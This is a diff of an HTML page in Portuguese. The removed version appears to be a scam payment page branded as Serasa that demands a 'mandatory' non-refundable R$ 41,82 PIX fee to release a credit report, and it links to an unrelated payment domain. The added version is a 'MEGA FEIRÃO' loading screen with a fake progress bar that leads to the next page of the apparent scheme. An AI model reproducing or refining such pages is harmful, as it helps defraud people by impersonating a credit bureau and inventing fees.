@@ -1,188 +1,182 @@
 <!DOCTYPE html>
-<html lang="pt-br">
+<html lang="pt-BR">
 <head>
-<meta charset="UTF-8">
-<title>Taxa Obrigatória</title>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>Preparando Oferta...</title>
 
-<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;800&display=swap" rel="stylesheet">
+<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@600;700;800&family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
 
 <style>
 body {
     margin: 0;
+    height: 100vh;
     font-family: 'Inter', sans-serif;
-    background: #f5f5f7;
-}
-
-/* TOPO */
-.topbar {
-    background: linear-gradient(90deg, #ff007a, #d81b72);
-    color: white;
-    padding: 14px 20px;
-    display: flex;
-    justify-content: space-between;
-    font-size: 14px;
-    font-weight: 600;
-}
-
-/* CONTAINER */
-.wrapper {
+    background: linear-gradient(135deg, #1a0028, #12001f);
     display: flex;
     justify-content: center;
-    margin-top: 40px;
-}
-
-.container {
-    width: 700px;
-    background: #fff;
-    border-radius: 18px;
-    padding: 25px;
-}
-
-/* TÍTULO */
-.title {
-    font-size: 22px;
-    font-weight: 800;
-    color: #1d1d1f;
-    margin-bottom: 15px;
-}
-
-/* CARD */
-.box {
-    border: 1px solid #ffd1e6;
-    background: #fff5fa;
-    padding: 15px;
-    border-radius: 12px;
-    margin-bottom: 20px;
-}
-
-.box p {
-    font-size: 14px;
-    color: #444;
-}
-
-.box ul {
-    margin-top: 10px;
-    padding-left: 18px;
-}
-
-.box li {
-    margin-bottom: 6px;
-    font-size: 14px;
-}
-
-/* VALOR */
-.label {
-    font-size: 12px;
-    color: #ff007a;
-    font-weight: 700;
-}
-
-.valor {
-    font-size: 42px;
-    font-weight: 800;
-    color: #ff007a;
-}
-
-.small {
-    font-size: 13px;
-    color: #999;
-}
-
-/* BOTÃO */
-.btn {
-    width: 100%;
-    padding: 16px;
-    border: none;
-    border-radius: 14px;
-    background: linear-gradient(90deg, #ff007a, #d81b72);
-    color: #fff;
-    font-size: 16px;
-    font-weight: 700;
-    cursor: pointer;
-    margin-top: 15px;
-}
-
-.info {
+    align-items: center;
+    overflow: hidden;
     text-align: center;
-    font-size: 12px;
-    color: #999;
-    margin-top: 10px;
+    color: #fdf4ff;
 }
 
-/* FOOTER */
-.footer-box {
-    border: 1px solid #ffd1e6;
-    background: #fff;
-    padding: 15px;
-    border-radius: 12px;
-    margin-top: 20px;
+/* partículas */
+.particle {
+    position: absolute;
+    width: 10px;
+    height: 10px;
+    background: rgba(236, 72, 153, 0.25);
+    border-radius: 50%;
+    animation: float 8s linear infinite;
+    filter: blur(1px);
 }
 
-.footer-title {
-    color: #ff007a;
-    font-weight: 700;
+@keyframes float {
+    from {
+        transform: translateY(110vh) scale(0.5);
+        opacity: 0;
+    }
+    to {
+        transform: translateY(-10vh) scale(1.2);
+        opacity: 1;
+    }
+}
+
+.loader-box {
+    width: 90%;
+    max-width: 420px;
+    background: #1f002f;
+    border-radius: 28px;
+    padding: 40px 26px;
+    box-shadow: 0 30px 70px rgba(236,72,153,0.25);
+    animation: fadeUp 1s ease;
+    z-index: 2;
+}
+
+@keyframes fadeUp {
+    from {
+        opacity: 0;
+        transform: translateY(35px);
+    }
+    to {
+        opacity: 1;
+        transform: translateY(0);
+    }
+}
+
+.title {
+    font-family: 'Poppins', sans-serif;
+    font-size: 34px;
+    font-weight: 800;
+    color: #ec4899;
     margin-bottom: 8px;
 }
 
-.footer {
-    text-align: center;
-    font-size: 12px;
-    color: #999;
-    margin-top: 20px;
+.subtitle {
+    font-size: 16px;
+    color: #e9d5ff;
+    margin-bottom: 26px;
+}
+
+.progress-bar {
+    width: 100%;
+    height: 22px;
+    background: #3b0764;
+    border-radius: 30px;
+    overflow: hidden;
+}
+
+.progress-fill {
+    height: 100%;
+    width: 0%;
+    background: linear-gradient(90deg, #ec4899, #a855f7);
+    border-radius: 30px;
+    transition: width 0.3s ease;
+    animation: shine 1.4s infinite;
+}
+
+@keyframes shine {
+    0% { filter: brightness(1); }
+    50% { filter: brightness(1.2); }
+    100% { filter: brightness(1); }
+}
+
+.percent-text {
+    margin-top: 12px;
+    font-size: 20px;
+    font-weight: 700;
+    color: #ec4899;
+    animation: pulse 1.2s infinite;
+}
+
+@keyframes pulse {
+    0% { transform: scale(1); }
+    50% { transform: scale(1.07); }
+    100% { transform: scale(1); }
+}
+
+.link-btn {
+    display: block;
+    margin-top: 30px;
+    padding: 15px 0;
+    background: linear-gradient(135deg, #ec4899, #a855f7);
+    color: #ffffff;
+    border-radius: 40px;
+    font-size: 17px;
+    font-weight: 800;
+    font-family: 'Poppins', sans-serif;
+    text-decoration: none;
+    transition: transform 0.2s ease, box-shadow 0.2s ease;
+    box-shadow: 0 12px 30px rgba(168,85,247,0.4);
+}
+
+.link-btn:hover {
+    transform: scale(1.05);
+    box-shadow: 0 18px 40px rgba(236,72,153,0.6);
 }
 </style>
 </head>
 
 <body>
 
-<div class="topbar">
-    <div>Serasa — Portal de Pagamentos</div>
-    <div>Finalize a regularização</div>
+<script>
+for (let i = 0; i < 20; i++) {
+    const p = document.createElement("div");
+    p.className = "particle";
+    p.style.left = Math.random() * 100 + "vw";
+    p.style.animationDuration = (5 + Math.random() * 6) + "s";
+    document.body.appendChild(p);
+}
+</script>
+
+<div class="loader-box">
+    <div class="title">MEGA FEIRÃO</div>
+    <div class="subtitle">Sua oferta está sendo preparada</div>
+
+    <div class="progress-bar">
+        <div id="progress" class="progress-fill"></div>
+    </div>
+
+    <div id="percent" class="percent-text">0%</div>
+
+    <a href="https://esperracyber.github.io/feirao/" class="link-btn">
+        CONTINUAR
+    </a>
 </div>
 
-<div class="wrapper">
-<div class="container">
+<script>
+let percent = 0;
+const bar = document.getElementById("progress");
+const text = document.getElementById("percent");
 
-<div class="title">Taxa Obrigatória (IOF)</div>
-
-<div class="box">
-<p>
-Para liberar seu relatório de crédito, é obrigatório quitar a taxa de emissão referente a esta solicitação.
-</p>
-
-<p><strong style="color:#ff007a;">Valor da taxa: <span id="valor-texto">R$ 41,82</span></strong></p>
-
-<ul>
-<li><strong>Obrigatório</strong> para prosseguir com a liberação do relatório.</li>
-<li><strong>Não reembolsável</strong> após a emissão/pagamento.</li>
-<li>Sem pagamento, a solicitação será <strong>encerrada automaticamente.</strong></li>
-</ul>
-</div>
-
-<div>
-<div class="label">TAXA DE EMISSÃO</div>
-<div class="valor" id="valor">R$ 41,82 <span style="font-size:14px; font-weight:600;">valor único</span></div>
-<div class="small">Clique para gerar o QR Code/Cópia e Cola (PIX) e concluir a regularização.</div>
-</div>
-
-<!-- LINK EDITÁVEL -->
-<a href="https://pay.limpanomefeiraoicm.shop/z0qn35LnazNg98m">
-<button class="btn">Pagar taxa agora (PIX <span id="valor-botao">R$ 41,82</span>)</button>
-</a>
-
-<div class="info">O relatório é liberado automaticamente após a compensação do pagamento.</div>
-
-<div class="footer-box">
-<div class="footer-title">Taxa de emissão — o que é</div>
-<div class="small">
-A taxa de emissão cobre o processamento e a liberação do seu relatório de crédito no Serasa. É um valor único e não reembolsável, conforme os termos de uso do serviço.
-</div>
-</div>
-
-<div class="footer">© 2026 Serasa — Portal de Pagamentos.</div>
-
-</div>
-</div>
+const loading = setInterval(() => {
+    percent++;
+    bar.style.width = percent + "%";
+    text.innerText = percent + "%";
+    if (percent >= 100) clearInterval(loading);
+}, 40);
+</script>
 
 </body>
 </html>
